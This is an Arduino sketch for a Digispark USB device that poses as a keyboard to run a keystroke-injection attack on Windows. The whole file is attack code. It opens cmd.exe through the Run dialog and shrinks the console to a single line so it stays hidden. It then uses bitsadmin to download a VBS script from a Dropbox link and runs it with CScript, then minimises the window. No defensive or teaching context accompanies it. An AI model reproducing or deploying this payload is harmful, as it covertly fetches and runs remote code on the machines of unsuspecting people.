#include "DigiKeyboard.h"
#define KEY_DOWN_ARROW 0x51
void setup() {
  //turn led off
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con:cols=18 lines=1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("bitsadmin /transfer wcb /priority high https://www.dropbox.com/s/g5ppuzglbjrgouc/Flugblatt05.vbs?dl=1 %USERPROFILE%/Flugblatt05.vbs");
  DigiKeyboard.delay(1000);                                   
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("CScript %USERPROFILE%/Flugblatt05.vbs");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW, MOD_GUI_LEFT);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

void loop() {
  //Credits to Herolais 
 

}
